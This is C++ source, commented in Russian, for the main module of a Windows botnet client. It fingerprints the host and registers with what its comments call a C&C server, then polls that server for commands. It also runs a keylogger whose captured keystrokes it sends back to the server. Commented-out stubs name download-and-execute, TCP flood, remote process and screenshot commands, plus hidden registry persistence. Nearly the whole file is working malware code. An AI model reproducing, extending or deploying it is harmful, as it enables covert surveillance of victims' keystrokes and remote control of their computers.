//#include "AggressiveOptimize.h" 
// данные ОС
//#include "OSVersionChecker.h"
#include "OSHwidChecker.h"
#include "OSCpuChecker.h"
#include "OSGpuChecker.h"
#include "OSNetVersionChecker.h"
#include "PEIsAdmin.h"
#include "OSGetRam.h"
// 
#include "Commands.h"
#include "Keylogger.h"
#include "Gate.h"


#include <WinSock2.h>
#include <WS2tcpip.h>
#include <Windows.h>
//#include <WinBase.h> // sleep function extra
#pragma comment(lib, "ws2_32.lib")

#include "StringOperations.h"
#include <inaddr.h>
#include <stdio.h>
#include <vector>
#include <iostream>

//#include <WinBase.h> // sleep function extra

bool continuePolling = true;
static CommandParserDelegate Parsers[500];
static PostPollDelegate Events[500];
int event_count = 0;

// надо убрать будет
const char SERVER_IP[] = "127.0.0.1";			// Enter local Server IP address
const int SERVER_PORT_NUM = 50007;				// Enter Open working server port
const short BUFF_SIZE = 1024;

char* botId = (char*)"-1";




// Сохраняет уникальный идентификатор бота, полученный от сервера.
void SetBotId(char* newId) {
	botId = (char*)malloc(strlen(newId) + 1);
	botId[strlen(newId)] = 0;
	memcpy_s(botId, strlen(newId), newId, strlen(newId));
}
// Возвращает текущий ID бота.
char* GetBotId() {
	return botId;
}


int send_(std::vector<char>& data) {
	// Key variables for all program
	int erStat;										// For checking errors in sockets functions

	//IP in string format to numeric format for socket functions. Data is in "ip_to_num"
	in_addr ip_to_num;
	inet_pton(AF_INET, SERVER_IP, &ip_to_num);

	// Socket initialization
	SOCKET ClientSock = socket(AF_INET, SOCK_STREAM, 0);

	if (ClientSock == INVALID_SOCKET) {
		std::cout << "Error initialization socket # " << WSAGetLastError() << std::endl;
		closesocket(ClientSock);
		WSACleanup();
	}
	else
		std::cout << "Client socket initialization is OK" << std::endl;

	// Establishing a connection to Server
	sockaddr_in servInfo;

	ZeroMemory(&servInfo, sizeof(servInfo));

	servInfo.sin_family = AF_INET;
	servInfo.sin_addr = ip_to_num;
	servInfo.sin_port = htons(SERVER_PORT_NUM);

	erStat = connect(ClientSock, (sockaddr*)&servInfo, sizeof(servInfo));

	if (erStat != 0) {
		std::cout << "Connection to Server is FAILED. Error # " << WSAGetLastError() << std::endl;
		closesocket(ClientSock);
		WSACleanup();
		return 1;
	}
	else
		std::cout << "Connection established SUCCESSFULLY. Ready to send a message to Server" << std::endl;

	std::vector<char> servBuff(BUFF_SIZE), clientBuff(BUFF_SIZE);

	short packet_size = 0;


	std::cout << "Your (Client) message to Server: ";
	//fgets(clientBuff.data(), clientBuff.size(), stdin);
	//fgets(clientBuff.data(), clientBuff.size(), data);
	//std::copy(data, data + sizeof(data), clientBuff.begin());
	clientBuff = data;
	for (int kk = 0; kk < data.size(); ++kk)
		std::cout << clientBuff[kk];
	std::cout << std::endl;

	packet_size = send(ClientSock, clientBuff.data(), clientBuff.size(), 0);

	if (packet_size == SOCKET_ERROR) {
		std::cout << "Can't send message to Server. Error # " << WSAGetLastError() << std::endl;
		closesocket(ClientSock);
		WSACleanup();
		return 1;
	}

	packet_size = recv(ClientSock, servBuff.data(), servBuff.size(), 0);

	if (packet_size == SOCKET_ERROR) {
		std::cout << "Can't receive message from Server. Error # " << WSAGetLastError() << std::endl;
		closesocket(ClientSock);
		WSACleanup();
		return 1;
	}
	else
		std::cout << "Server message: " << servBuff.data() << std::endl;

	data = servBuff;
	closesocket(ClientSock);
	return 0;
}




/*       УПРАВЛЕНИЕ СОБЫТИЯМИ И ПАРСЕРАМИ         */
// Выполняет все зарегистрированные события
void RunEvents() {
	for (int i = 0; i < event_count; i++) {
		Events[i]();
	} // Перебирает массив Events и вызывает каждую функцию-обработчик
}
// Ищет индекс обработчика proc в массиве Events.
int GetEventIndex(PostPollDelegate proc) {
	for (int i = 0; i < event_count; i++)
		if (Events[i] == proc) return i;

	return -1;
}
// Добавляет новый обработчик событий в массив Events (максимум 500)
bool AddEvent(PostPollDelegate proc) {
	int existing = GetEventIndex(proc);
	if (existing != -1) return true;

	if (event_count == 500) return false;
	Events[event_count] = proc;
	event_count++;
	return true;
}
// Удаляет обработчик proc из массива Events
bool RemoveEvent(PostPollDelegate proc) {
	int existing = GetEventIndex(proc);
	if (existing == -1) return true;

	for (int i = existing + 1; i < event_count; i++) {
		Events[existing++] = Events[i];
	}

	event_count--;
	return true;
}



/*              РАБОТА С КЕЙЛОГЕРОМ               */
// Отправляет накопленные данные кейлоггера на C&C-сервер.
void KeylogFlushEvent() {
	int length;
	char* result = FlushKeylogBuffer(&length); // Собирает данные из буфера кейлоггера.
	if (length != 0) {
		char* command = CreateCommand(-1, COMMAND_KEYLOG, result, length); // Формирует команду COMMAND_KEYLOG.
		std::vector<char> request(BUFF_SIZE);
		std::copy(command, command + strlen(command), request.begin());
		int eror = send_(request);
		if (eror != 0) {
			return;
		}
		FreeCommand(command);
	}

	FreeFlushKeylogBufferResult(result); // освобождает память ??
}
// управление кейлоггером
void KeylogParser(int commandId, int commandType, char* data)
{
	char* responsedata;
	if (strcmp(data, "start") == 0) { // Запускает кейлоггер и добавляет KeylogFlushEvent в обработчики
		bool res = StartLogger();
		responsedata = res ? (char*)"true" : (char*)"false";
		if (res) AddEvent(KeylogFlushEvent);
	}
	else if (strcmp(data, "stop") == 0) { // Останавливает кейлоггер и удаляет KeylogFlushEvent
		bool res = StopLogger();
		responsedata = res ? (char*)"true" : (char*)"false";
		if (res) RemoveEvent(KeylogFlushEvent);
	}
	else if (strcmp(data, "check_buf") == 0) { // Останавливает кейлоггер и удаляет KeylogFlushEvent
		KeylogFlushEvent();
		return;
	}
	else {
		responsedata = (char*)"error";
	}

	std::vector<char> request(BUFF_SIZE);
	char* command = CreateCommand(commandId, commandType, responsedata, strlen(responsedata));
	std::copy(command, command + strlen(command), request.begin());
	int eror = send_(request);
	if (eror != 0) {
		return;
	}
	//free(responsedata);
	FreeCommand(command);

	/*
	char* response = SendCommandWithDecodedResponse(command);
	FreeDecodedResponse(response);
	FreeCommand(command); */
}


void WaitParser (int commandId, int commandType, char* data) {
	Sleep(POLL_RATE/3);
}



// получение параметров ОС (в 1 строку)
char* GetInitialJoinCommand()
{
	char* hwid = (char*)malloc(100);
	getHwid(hwid, 100);

	//char* os = (char*)malloc(100);
	//windowsVersionName(os, 99);

	char* cpu = (char*)malloc(100);
	getCpuName(cpu, 99);

	char* gpu = (char*)malloc(200);
	getGpuName(gpu, 199);

	char* netVersion = (char*)malloc(50);
	getLastestNETinstalled(netVersion, 49);

	char* admin = (char*)malloc(6);
	admin[5] = '\0';
	check(admin, 5);

	char* ram = (char*)malloc(20);
	getram(ram, 19);

	//int elementSize = 13;
	//char** formattedString = new char* [elementSize] { hwid, (char*)"@", os, (char*)"@", cpu, (char*)"@", gpu, (char*)"@", netVersion, (char*)"@", admin, (char*)"@", ram };
	int elementSize = 11;
	char** formattedString = new char* [elementSize] { hwid, (char*)"@", cpu, (char*)"@", gpu, (char*)"@", netVersion, (char*)"@", admin, (char*)"@", ram };

	int finalLength;
	char* finalBuffer = JoinString(formattedString, elementSize, &finalLength);
	free(hwid);
	free(cpu);
	free(gpu);
	free(netVersion);
	free(admin);
	free(ram);
	//free(os);


	//std::vector<char> Buff_os(BUFF_SIZE);
	//std::copy(finalBuffer, finalBuffer + finalLength, Buff_os.begin());


	char* command = CreateCommand(-1, COMMAND_JOIN, finalBuffer, finalLength);
	free(finalBuffer);

	return command;
	//return Buff_os;
}




/*              ВЗАИМОДЕЙСТВИЕ С C&C-СЕРВЕРОМ                        */
// Устанавливает уникальный ID бота при подключении к серверу
 void JoinParser(int commandId, int commandType, char* data)
{
	SetBotId(data);
	printf("Bot ID: %s\n", data);
}
// Обрабатывает пакет с несколькими командами от сервера (разделены \n).
void PollParser(int commandId, int commandType, char* data)
{
	int numResults;
	char** splitResults = SplitString(data, (char*)"\n", &numResults); // Разбивает данные на отдельные команды.

	for (int i = 0; i < numResults; i++) // Вызывает соответствующие парсеры для каждой команды.
	{
		char* newCommandData;
		int newCommandType;
		int newCommandId = ParseCommand(splitResults[i], &newCommandData, &newCommandType, (char*)"!");

		if (newCommandType < 0)
			continuePolling = false;
		else if (newCommandType != COMMAND_POLL && newCommandType < 500 && Parsers[newCommandType] != NULL)
			Parsers[newCommandType](newCommandId, newCommandType, newCommandData);

		FreeParsedCommandResult(newCommandData);
	}

	FreeSplitStringBuffer(splitResults, numResults);
}
// Основной цикл опроса сервера
void InitializePollThread()
{
	char* request_buf = GetInitialJoinCommand(); // получить данные ОС
	std::vector<char> request(BUFF_SIZE);
	std::copy(request_buf, request_buf + strlen(request_buf), request.begin());
	int eror = send_(request); // отправляем запрос на сервер (c регистрацией бота) -1|COMMAND_JOIN|
	free(request_buf);
	if (eror != 0) {
		return;
	}

	char response[BUFF_SIZE];// = request;
	std::copy(request.begin(), request.begin() + request.size(), response);
	for (int i = 0; i < BUFF_SIZE; i++)
		request[i] = '\00';

	char* commandData; // данные команды
	int commandType; // id команды из списка
	int commandId; // сам номер команды от сервера

	commandId = ParseCommand(response, &commandData, &commandType, "|"); // разделяет response на три строки

	if (commandType < 0)
		continuePolling = false;
	else if (commandType < 500 && Parsers[commandType] != NULL)
		Parsers[commandType](commandId, commandType, commandData);

	free(commandData);
	//free(response); 
	
	char* poll = CreateCommand(commandId, COMMAND_POLL, (char*)"", 0); // создание запроса -1|COMMAND_POLL|

	while (continuePolling) // В бесконечном цикле отправляет запросы COMMAND_POLL и обрабатывает ответы.
	{
		RunEvents();

		std::copy(poll, poll + strlen(poll), request.begin());
		int eror = send_(request);
		if (eror != 0) {
			return;
		}
		std::copy(request.begin(), request.begin() + request.size(), response);
		
		commandId = ParseCommand(response, &commandData, &commandType, "|");

		if (commandType < 0)
			continuePolling = false; //if its less than zero, quit app to prevent excepttion.
		else if (commandType < 500 && Parsers[commandType] != NULL)
			Parsers[commandType](commandId, commandType, commandData);

		for (int i = 0; i < BUFF_SIZE; i++)
			request[i] = '\00';
		free(commandData);
		//free(response);

		Sleep(POLL_RATE); // интервал опроса сервера
	}
}



void InitializeParsers()
{
	ZeroMemory(Parsers, sizeof(CommandParserDelegate) * 500);
	Parsers[COMMAND_JOIN] = JoinParser; // COMMAND_JOIN
	Parsers[COMMAND_POLL] = PollParser; // 1
	//Parsers[COMMAND_CHECKIFSITEISUP] = SiteCheckerParser;
	//Parsers[COMMAND_MESSAGEBOX] = MessageBoxParser;
	Parsers[COMMAND_KEYLOG] = KeylogParser;
	//Parsers[COMMAND_REMOTEPROCESS] = RemoteProcessParser;
	//Parsers[COMMAND_DOWNLOADEXECUTE] = DownloadExecuteParser;
	//Parsers[COMMAND_REMOTEPROCESSNORESULT] = RemoteProcessNoResultParser;
	//Parsers[COMMAND_TCPFLOOD] = TCPFloodParser;
	//Parsers[COMMAND_UPDATE] = DownloadAndUpdate;
	//Parsers[COMMAND_SCREENSHOT] = ScreenshotParser;
	Parsers[250] = WaitParser;
}

// стандартная инициализации сокетного API Windows.
bool SocketStartup()
{
	// Инициализирует сокеты Windows через WSAStartup (требуется для использования сокетов на Windows).
	WSADATA wsaData;
	int err;

	// Если инициализация проходит успешно, возвращает true, иначе — false.
	err = WSAStartup(MAKEWORD(2, 2), &wsaData);
	if (err != 0) return false;

	if (LOBYTE(wsaData.wVersion) != 2 || HIBYTE(wsaData.wVersion) != 2) {
		WSACleanup();
		return false;
	}
	else
		return true;
}
// завершает использование сокетов
void SocketCleanup()
{
	WSACleanup();
}

//int WINAPI WinMain(HINSTANCE inst, HINSTANCE prev, LPSTR cmd, int show)
int main(void)
{
	// 1. Автозагрузка:
	// Создает скрытую папку в %APPDATA%
	// Добавляет бота в автозагрузку через реестр(RunStartupRoutine)

	// HANDLE hThread = NULL;
	// DWORD dwThreadId = NULL;

	// Allocate structure   <---- Выделить структуру
	// PINSTALLATION_INFO ptrInstallInfo = (PINSTALLATION_INFO)malloc(sizeof(INSTALLATION_INFO));
	// RtlSecureZeroMemory(ptrInstallInfo, sizeof(INSTALLATION_INFO));

	// Populate structure with values   <---- Заполнить структуру значениями
	// ptrInstallInfo->wStrFileName = (wchar_t*)L"FileName.exe";
	// ptrInstallInfo->wStrFolderName = (wchar_t*)L"FolderName";
	// ptrInstallInfo->wStrRegKeyName = (wchar_t*)L"RegKey";
	// ptrInstallInfo->dwInstallationAttributes = FILE_ATTRIBUTE_HIDDEN;

	// Create new thread   <---- Создать новый поток
	// hThread = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)RunStartupRoutine, (LPVOID)ptrInstallInfo, NULL, &dwThreadId);
	// не используется WaitForSingleObject(hThread, INFINITE);

	// 2. Сеть:
	// Инициализирует сокеты (SocketStartup)
	if (!SocketStartup()) return 0;

	// 3. Цикл работы:
	InitializeParsers(); // Запускает парсеры команд
	InitializePollThread(); // Начинает опрос сервера

	WSACleanup(); // очистка сокета
	return 0;
}
